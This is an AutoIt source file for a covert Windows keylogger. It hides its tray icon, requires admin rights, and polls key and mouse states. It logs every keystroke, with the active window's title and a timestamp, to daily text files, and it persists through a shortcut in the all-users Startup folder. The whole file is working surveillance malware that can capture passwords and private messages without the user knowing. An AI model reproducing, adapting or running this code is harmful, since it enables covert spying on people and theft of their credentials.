#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ***12 *
#AutoIt3Wrapper_Compile_Both=y
#AutoIt3Wrapper_Res_requestedExecutionLevel=requireAdministrator
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****

#Region Config
#include <Misc.au3>
#include <File.au3>
#include <String.au3>
#include <Date.au3>
#include <GUIConstantsEx.au3> ;no
#include <WindowsConstants.au3> ;Not
#include <UpdownConstants.au3>
Opt("SendKeyDelay", 150)
Opt("SendKeyDownDelay", 50)
Opt("TrayMenuMode", 1) ; Default tray menu items (Script Paused/Exit) will not be shown.
#EndRegion Config
#Region Constant
Global Const $STRING_LENGTH_TRIGGER = 32;
#EndRegion Constant
#Region Variable
Global $dll = DllOpen("user32.dll")
Global $sCurentTitle = String(Random(1, 999, 0))
Global $sLog = ""
Global $bIsShiftDown = False
Global $bIsCapsOn = _GetCapsNumlScro(1)
Global $fTimer = TimerInit()
#EndRegion Variable


#Region Key Hook Func
; #FUNCTION# ====================================================================================================================
; Name...............:	_GetCapsNumlScro
; Description .......:	Get state of Capslock, Numlock, Scrolllock
; Parameters ........:	$iID
;									1 =  Capslock
;									2 = Numlock
;									3 = Scrolllock
; Return values .....:	[On Success		- ]
;						[On Failure		-  Return  and sets @ERROR
;						@ERROR			-
;						@Extended		- ]
; Author ............:	DogFox
; ===============================================================================================================================
Func _GetCapsNumlScro($iID)
	Local $VK_NUMLOCK = 0x90
	Local $VK_SCROLL = 0x91
	Local $VK_CAPITAL = 0x14
	Local $aMsg
	$aMsg = DllCall($dll, "long", "GetKeyState", "long", $VK_CAPITAL)
	Select
		Case $aMsg[0] = 1 Or $aMsg[0] = 128 Or $aMsg[0] = 65409
			Return 1
		Case $aMsg[0] = 0 Or $aMsg[0] = 127 Or $aMsg[0] = 65408
			Return 0
	EndSelect
EndFunc   ;==>_GetCapsNumlScro
; #FUNCTION# ====================================================================================================================
; Name...............:	_IsPressed
; Description .......:	Check if key is pressed
; Parameters ........:	LOL
; Return values .....:	LOL
; Author ............:	Internet
; ===============================================================================================================================
Func _IsPressed2($sHexKey, $vDLL = 'user32.dll')
	Local $a_R = DllCall($vDLL, "int", "GetAsyncKeyState", "int", '0x' & $sHexKey)
	If Not @error And BitAND($a_R[0], 0x8000) = 0x8000 Then Return 1
	Return 0
EndFunc   ;==>_IsPressed
; #FUNCTION# ====================================================================================================================
; Name...............:	_IsReleased
; Description .......:	Check if key is released
; Parameters ........:	LOL
; Return values .....:	LOL
; Author ............:	Internet
; ===============================================================================================================================
Func _IsReleased($sHexKey, $vDLL = 'user32.dll')
	Local $a_R = DllCall($vDLL, "int", "GetAsyncKeyState", "int", '0x' & $sHexKey)
	If Not @error And BitAND($a_R[0], 0x8000) = 0x8000 Then Return 0
	Return 1
EndFunc   ;==>_IsReleased
; #FUNCTION# ====================================================================================================================
; Name...............:	_getKey
; Description .......:	Process keys and mouse buttons to memory
; Parameters ........:	None
; Return values .....:	None
; Author ............:	DogFox
; ===============================================================================================================================
Func _getKey()
	Select
		;  {  `~  1!  2@  3#  4$  5%  6^  7&  8*  9(  0)  -_  =+  [{  ]}  \|  ;:  '"  ,<  .>  /?  }
		Case _IsPressed2("c0", $dll) ;  `~
			_waitReleased("c0")
			_putLogFollowShift($sLog, "`", "~")
		Case _IsPressed2("31", $dll) ;  1!
			_waitReleased("31")
			_putLogFollowShift($sLog, "1", "!")
		Case _IsPressed2("32", $dll) ;  2#
			_waitReleased("32")
			_putLogFollowShift($sLog, "2", "@")
		Case _IsPressed2("33", $dll) ;  3#
			_waitReleased("33")
			_putLogFollowShift($sLog, "3", "#")
		Case _IsPressed2("34", $dll) ;  4$
			_waitReleased("34")
			_putLogFollowShift($sLog, "4", "$")
		Case _IsPressed2("35", $dll) ;  5%
			_waitReleased("35")
			_putLogFollowShift($sLog, "5", "%")
		Case _IsPressed2("36", $dll) ;  6^
			_waitReleased("36")
			_putLogFollowShift($sLog, "6", "^")
		Case _IsPressed2("37", $dll) ;  7&
			_waitReleased("37")
			_putLogFollowShift($sLog, "7", "&")
		Case _IsPressed2("38", $dll) ;  8*
			_waitReleased("38")
			_putLogFollowShift($sLog, "8", "*")
		Case _IsPressed2("39", $dll) ;  9(
			_waitReleased("39")
			_putLogFollowShift($sLog, "9", "(")
		Case _IsPressed2("30", $dll) ;  0)
			_waitReleased("30")
			_putLogFollowShift($sLog, "0", ")")
		Case _IsPressed2("bd", $dll) ;  -_
			_waitReleased("bd")
			_putLogFollowShift($sLog, "-", "_")
		Case _IsPressed2("bb", $dll) ;  =+
			_waitReleased("bb")
			_putLogFollowShift($sLog, "=", "+")
		Case _IsPressed2("db", $dll) ;  [{
			_waitReleased("db")
			_putLogFollowShift($sLog, "[", "{")
		Case _IsPressed2("dd", $dll) ;  ]}
			_waitReleased("dd")
			_putLogFollowShift($sLog, "]", "}")
		Case _IsPressed2("dc", $dll) ;  \|
			_waitReleased("dc")
			_putLogFollowShift($sLog, "\", "|")
		Case _IsPressed2("ba", $dll) ;  ;:
			_waitReleased("ba")
			_putLogFollowShift($sLog, ";", ":")
		Case _IsPressed2("de", $dll) ;  '"
			_waitReleased("de")
			_putLogFollowShift($sLog, "'", """")
		Case _IsPressed2("bc", $dll) ;  ,<
			_waitReleased("bc")
			_putLogFollowShift($sLog, ",", "<")
		Case _IsPressed2("be", $dll) ;  .>
			_waitReleased("be")
			_putLogFollowShift($sLog, ".", ">")
		Case _IsPressed2("bf", $dll) ;  /?
			_waitReleased("bf")
			_putLogFollowShift($sLog, "/", "?")
			;  NUMPAD {  0  1  2  3  4  5  6  7  8  9  }
		Case _IsPressed2("60", $dll) ;  0
			_waitReleased("60")
			_putLog($sLog, "0")
		Case _IsPressed2("61", $dll) ;  1
			_waitReleased("61")
			_putLog($sLog, "1")
		Case _IsPressed2("62", $dll) ;  2
			_waitReleased("62")
			_putLog($sLog, "2")
		Case _IsPressed2("63", $dll) ;  3
			_waitReleased("63")
			_putLog($sLog, "3")
		Case _IsPressed2("64", $dll) ;  4
			_waitReleased("64")
			_putLog($sLog, "4")
		Case _IsPressed2("65", $dll) ;  5
			_waitReleased("65")
			_putLog($sLog, "5")
		Case _IsPressed2("66", $dll) ;  6
			_waitReleased("66")
			_putLog($sLog, "6")
		Case _IsPressed2("67", $dll) ;  7
			_waitReleased("67")
			_putLog($sLog, "7")
		Case _IsPressed2("68", $dll) ;  8
			_waitReleased("68")
			_putLog($sLog, "8")
		Case _IsPressed2("69", $dll) ;  9
			_waitReleased("69")
			_putLog($sLog, "9")
			;  {  aA  bB  cC  ...  zZ  yY  zZ  }
		Case _IsPressed2("41", $dll)
			_waitReleased("41")
			_putLogFollowShiftCaps($sLog, "a", "A")
		Case _IsPressed2("42", $dll)
			_waitReleased("42")
			_putLogFollowShiftCaps($sLog, "b", "B")
		Case _IsPressed2("43", $dll)
			_waitReleased("43")
			_putLogFollowShiftCaps($sLog, "c", "C")
		Case _IsPressed2("44", $dll)
			_waitReleased("44")
			_putLogFollowShiftCaps($sLog, "d", "D")
		Case _IsPressed2("45", $dll)
			_waitReleased("45")
			_putLogFollowShiftCaps($sLog, "e", "E")
		Case _IsPressed2("46", $dll)
			_waitReleased("46")
			_putLogFollowShiftCaps($sLog, "f", "F")
		Case _IsPressed2("47", $dll)
			_waitReleased("47")
			_putLogFollowShiftCaps($sLog, "g", "G")
		Case _IsPressed2("48", $dll)
			_waitReleased("48")
			_putLogFollowShiftCaps($sLog, "h", "H")
		Case _IsPressed2("49", $dll)
			_waitReleased("49")
			_putLogFollowShiftCaps($sLog, "i", "I")
		Case _IsPressed2("4a", $dll)
			_waitReleased("4a")
			_putLogFollowShiftCaps($sLog, "j", "J")
		Case _IsPressed2("4b", $dll)
			_waitReleased("4b")
			_putLogFollowShiftCaps($sLog, "k", "K")
		Case _IsPressed2("4c", $dll)
			_waitReleased("4c")
			_putLogFollowShiftCaps($sLog, "l", "L")
		Case _IsPressed2("4d", $dll)
			_waitReleased("4d")
			_putLogFollowShiftCaps($sLog, "m", "M")
		Case _IsPressed2("4e", $dll)
			_waitReleased("4e")
			_putLogFollowShiftCaps($sLog, "n", "N")
		Case _IsPressed2("4f", $dll)
			_waitReleased("4f")
			_putLogFollowShiftCaps($sLog, "o", "O")
		Case _IsPressed2("50", $dll)
			_waitReleased("50")
			_putLogFollowShiftCaps($sLog, "p", "P")
		Case _IsPressed2("51", $dll)
			_waitReleased("51")
			_putLogFollowShiftCaps($sLog, "q", "Q")
		Case _IsPressed2("52", $dll)
			_waitReleased("52")
			_putLogFollowShiftCaps($sLog, "r", "R")
		Case _IsPressed2("53", $dll)
			_waitReleased("53")
			_putLogFollowShiftCaps($sLog, "s", "S")
		Case _IsPressed2("54", $dll)
			_waitReleased("54")
			_putLogFollowShiftCaps($sLog, "t", "T")
		Case _IsPressed2("55", $dll)
			_waitReleased("55")
			_putLogFollowShiftCaps($sLog, "u", "U")
		Case _IsPressed2("56", $dll)
			_waitReleased("56")
			_putLogFollowShiftCaps($sLog, "v", "V")
		Case _IsPressed2("57", $dll)
			_waitReleased("57")
			_putLogFollowShiftCaps($sLog, "w", "W")
		Case _IsPressed2("58", $dll)
			_waitReleased("58")
			_putLogFollowShiftCaps($sLog, "x", "X")
		Case _IsPressed2("59", $dll)
			_waitReleased("59")
			_putLogFollowShiftCaps($sLog, "y", "Y")
		Case _IsPressed2("5a", $dll)
			_waitReleased("5a")
			_putLogFollowShiftCaps($sLog, "z", "Z")
			;UP DOWN LEFT RIGHT...
		Case _IsPressed2("25", $dll) ;  left
			_waitReleased("25")
			_putLog($sLog, "{LEFT}")
		Case _IsPressed2("26", $dll) ;  up
			_waitReleased("26")
			_putLog($sLog, "{UP}")
		Case _IsPressed2("27", $dll) ;  right
			_waitReleased("27")
			_putLog($sLog, "{RIGHT}")
		Case _IsPressed2("28", $dll) ;  down
			_waitReleased("28")
			_putLog($sLog, "{DOWN}")
		Case _IsPressed2("01", $dll) ;  left mouse
			_waitReleased("01")
			_putLog($sLog,"{mL}")
		Case _IsPressed2("02", $dll) ;  right mouse
			_waitReleased("02")
			_putLog($sLog, "{mR}")
		Case _IsPressed2("0D", $dll) ;  enter
			_waitReleased("0D")
			_putLog($sLog,"{ENTER}" & @CRLF)
		Case _IsPressed2("09", $dll) ;  tab
			_waitReleased("09")
			_putLogFollowShift($sLog,"{TAB}",  "{shift+TAB}")
		Case _IsPressed2("20", $dll) ;  space
			_waitReleased("20")
			_putLog($sLog, " ")
		Case _IsPressed2("08", $dll) ; back space
			_waitReleased("08")
			_putLog($sLog, "{<--}")
		Case _IsPressed2("11", $dll) ;  ctrl
			_waitReleased("11")
			_putLog($sLog, "{CTRL}")
		Case _IsPressed2("12", $dll) ;  alt
			_waitReleased("12")
			_putLog($sLog, "{ALT}")
		Case _IsPressed2("23", $dll) ;  end
			_waitReleased("23")
			_putLog($sLog, "{END}")
		Case _IsPressed2("24", $dll) ;  home
			_waitReleased("24")
			_putLog($sLog, "{HOME}")
		Case _IsPressed2("14", $dll) ;  caps
			$bIsCapsOn = _GetCapsNumlScro(1)
		Case _IsPressed2("1b", $dll) ;  esc
			_waitReleased("1b")
			_putLog($sLog, "{ESC}")
		Case _IsPressed2("10", $dll) ;  shift down
			If Not $bIsShiftDown Then
				Sleep(30)
				$bIsShiftDown = True
			EndIf
		Case _IsReleased("10", $dll) ;  shift up
			If $bIsShiftDown Then
				Sleep(30)
				$bIsShiftDown = False
			EndIf
	EndSelect
EndFunc   ;==>_getKey
; #FUNCTION# ====================================================================================================================
; Name...............:	_waitReleased
; Description .......:	Wait until key is released
; Parameters ........:	$sKey - Key
; Return values .....:	None
; Author ............:	DogFox
; ===============================================================================================================================
Func _waitReleased($sKey)
	Do
	Until _IsReleased($sKey, $dll)
EndFunc   ;==>_waitReleased
; #FUNCTION# ====================================================================================================================
; Name...............:	_putLog
; Description .......:	Put logged data into output string
; Parameters ........:	Reference : $sOutput
;						$sString : Data to save
; Return values .....:	None
; Author ............:	DogFox
; ===============================================================================================================================
Func _putLog(ByRef $sOutput, $sString)
	Local $sTitle = WinGetTitle("[active]")
	If $sTitle <> $sCurentTitle Then
		$sCurentTitle = $sTitle
		$sOutput &=  @CRLF & "[LOG][" & @HOUR & ":" & @MIN & ":" & @SEC & "][" & $sCurentTitle & "]: "
	EndIf
	$sOutput &= $sString
	If StringLen($sOutput) >= $STRING_LENGTH_TRIGGER then
		$ret = FileWrite("LOG\" & @YEAR & "-" & @MON & "-" & @MDAY & ".txt",$sOutput)
		if $ret == 0 then
			DirCreate("LOG")
		Else
			$sOutput = ""
		EndIf
	EndIf
EndFunc   ;==>_putLog
; #FUNCTION# ====================================================================================================================
; Name...............:	_putLogFollowShift
; Description .......:	Put logged data into output string follow SHIFT button
; Parameters ........:	Reference : $sOutput
;						$sStringUp : Data to save (SHIFT UP)
;						$sStringDown : Data to save (SHIFT DOWN)
; Return values .....:	None
; Author ............:	DogFox
; ===============================================================================================================================
Func _putLogFollowShift(ByRef $sOutput, $sStringUp, $sStringDown)
	If $bIsShiftDown Then
		_putLog($sOutput, $sStringDown)
	Else
		_putLog($sOutput, $sStringUp)
	EndIf
EndFunc   ;==>_putLogFollowShift
; #FUNCTION# ====================================================================================================================
; Name...............:	_putLogFollowShift
; Description .......:	Put logged data into output string follow SHIFT button
; Parameters ........:	Reference : $sOutput
;						$sStringUp : Data to save (SHIFT UP)
;						$sStringDown : Data to save (SHIFT DOWN)
; Return values .....:	None
; Author ............:	DogFox
; ===============================================================================================================================
Func _putLogFollowShiftCaps(ByRef $sOutput, $sStringLower, $sStringUpper)
	;$bIsCapsOn=_getCapsNumlScro(1)
	Select
		Case $bIsCapsOn And $bIsShiftDown
			_putLog($sOutput, $sStringLower)
		Case $bIsCapsOn And Not $bIsShiftDown
			_putLog($sOutput, $sStringUpper)
		Case Not $bIsCapsOn And $bIsShiftDown
			_putLog($sOutput, $sStringUpper)
		Case Not $bIsCapsOn And Not $bIsShiftDown
			_putLog($sOutput, $sStringLower)
	EndSelect
EndFunc   ;==>_putLogFollowShiftCaps
#EndRegion Key Hook Func
#Region Main

global $scriptAlias = StringLeft(@ScriptName, StringLen(@ScriptName) - 4)
If _Singleton($scriptAlias, 1) = 0 Then
    MsgBox($MB_SYSTEMMODAL, "ERROR", "An occurrence of " & $scriptAlias & " is already running")
    Exit
EndIf
if FileCreateShortcut(@ScriptFullPath, @ProgramsCommonDir & "\Startup\" & $scriptAlias) == 0 Then
	MsgBox($MB_SYSTEMMODAL, "ERROR", "Cannot create startup entry")
EndIf

If DirCreate("LOG") == 0 Then
	MsgBox($MB_SYSTEMMODAL, "ERROR", "Cannot create folder")
	Exit
EndIf

While 1
	Sleep(10)
	_getKey()
WEnd
#EndRegion Main
